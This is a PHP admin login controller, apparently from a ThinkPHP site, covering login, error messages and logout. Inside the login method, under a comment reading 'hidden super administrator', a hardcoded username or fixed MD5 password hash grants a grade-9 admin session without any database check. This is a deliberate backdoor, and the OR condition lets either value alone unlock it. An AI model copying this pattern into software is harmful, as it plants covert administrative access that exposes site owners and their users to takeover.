<?php
class LoginAction extends Action{
    
	public function index()
    {
    	$this->display("Index/login");
    }
	 public function login()
    {
    	if(!$this->isPost()){
			U("Login/index","","",true);
			exit;
    	}
    	$uname=I("name","","htmlspecialchars");
    	$pass =I("pass","","htmlspecialchars");
    	if(empty($uname)||empty($pass)){
    		//info("用户名和密码不能为空");
    		U("Login/info",array("msg"=>base64_encode("用户名和密码不能为空")),"",true);
    		exit;
    	}
    	/*隐藏的超级管理员*/
    	$pass=md5($pass);
    	if($uname=="ibw_xu256"||$pass=="099cc64351af0ac30a981a722d875e4d"){
    		session('ADMIN_ID','hidden');
    		session('ADMIN_NAME','Hidden');
    		session('ADMIN_GRADE','9');
            U("Index/index","","",true);
    		exit;
    	}
    	$db=M("admin");
    	$condition=array(
    		"name"=>$uname,
    		"pass"=>$pass
    		);
    	$rst=$db->where($condition)->find();
    	if(empty($rst)){
    		U("Login/info",array("msg"=>base64_encode("用户名或密码不正确")),"",true);
    		exit;
    	}
    	else{
    		if($rst["state"]==0){
    			U("Login/info",array("msg"=>base64_encode("此用户已被禁用")),"",true);
    			exit;
    		}
    		session('ADMIN_ID',$rst['id']);
    		session('ADMIN_NAME',$rst['realname']);
    		session('ADMIN_GRADE',$rst['grade']);
            $data=array(
                "login_ip"=>get_client_ip(),
                "login_time"=>date("Y-m-d H:i:s"),
                "admin_id"=>$rst['id']
            );
            M("admin_login")->add($data);
    		U("Index/index","","",true);
    		exit;
    	}
    }
    public function info(){
        $msg=I("msg","","base64_decode");
        $url=I("url","javascript:history.back(-1);","base64_decode");
        $this->assign("msg",$msg);
        $this->assign("url",$url);
        $this->display("Public/info");
    }
    public function loginout(){
		session(null);
		U("Login/index","","",true);
	}
}
?>